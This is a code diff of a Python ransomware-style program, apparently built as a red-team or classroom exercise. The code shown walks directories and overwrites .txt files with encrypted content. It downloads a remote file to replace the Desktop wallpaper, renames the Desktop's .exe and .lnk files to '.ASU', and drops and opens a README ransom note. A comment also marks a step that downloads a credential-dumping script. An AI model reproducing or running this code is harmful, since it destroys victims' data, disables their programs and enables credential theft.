@@ -4,7 +4,6 @@ import ctypes
 import platform
 import urllib.request
 import pyautogui
-import shutil
 import subprocess
 import requests
 
@@ -50,7 +49,7 @@ def encrypt():
     try:
         for root, dirs, files in os.walk(os.getcwd()):
             for file_name in files:
-                if file_name.endswith(".txt"):
+                if file_name.endswith((".txt")):
                     file_path = os.path.join(root, file_name)
 
                     with open(file_path, "r") as f:
@@ -60,16 +59,12 @@ def encrypt():
 
                     with open(file_path, "wb") as f:
                         f.write(encrypted)
+                
                     # print(f"Encrypted {file_name} on the Desktop.")
+                
                         
     except FileNotFoundError:
         print("Error encrypting files. Desktop directory not found.")
-
-            # print(encrypted)
-                
-            # # add new extention   
-            # new_file_path =  j + ".asu"
-            # os.rename(j, new_file_path)
 
 # Get the file
 def download_file(url, destination):
@@ -124,13 +119,11 @@ Blue Team Privy
         print(f"Error: {e}")
 
 # Change icon in Desktop
-def change_extension_on_desktop(old_extension, new_extension):
-    desktop_directory = os.path.join(os.path.expanduser("~"), "Desktop")
-
-    for filename in os.listdir(desktop_directory):
+def change_extension(directory, old_extension, new_extension):
+    for filename in os.listdir(directory):
         if filename.endswith(old_extension):
-            old_filepath = os.path.join(desktop_directory, filename)
-            new_filepath = os.path.join(desktop_directory, filename.rsplit('.', 1)[0] + new_extension)
+            old_filepath = os.path.join(directory, filename)
+            new_filepath = os.path.join(directory, filename.rsplit('.', 1)[0] + new_extension)
             os.rename(old_filepath, new_filepath)
             print(f"Changed {old_filepath} to {new_filepath}")
 
@@ -214,19 +207,19 @@ if __name__ == "__main__":
     change_wallpaper(download_path)
 
     # Change extension from .lnk to .ASU on the desktop
-    change_extension_on_desktop(".lnk", ".ASU")
+    change_extension(desktop_directory, ".lnk", ".ASU")
 
     # Change extension from .exe to .ASU on the desktop
-    change_extension_on_desktop(".exe", ".ASU")
+    change_extension(desktop_directory, ".exe", ".ASU")
+
+    # # Change extension from .jpg to .ASU on the desktop
+    # change_extension(desktop_directory, ".jpg", ".ASU")
 
     # Call the function to add README text
     add_readme(file_path)
 
     # Optionally, remove the downloaded file after changing the wallpaper
     os.remove(download_path)
-
-    # Open readme.txt
-    open_readme_on_desktop()
 
     # Credential Dumping
     # Download the script
@@ -237,3 +230,6 @@ if __name__ == "__main__":
 
     #Back to Desktop
     backDesktop()
+
+     # Open readme.txt
+    open_readme_on_desktop()
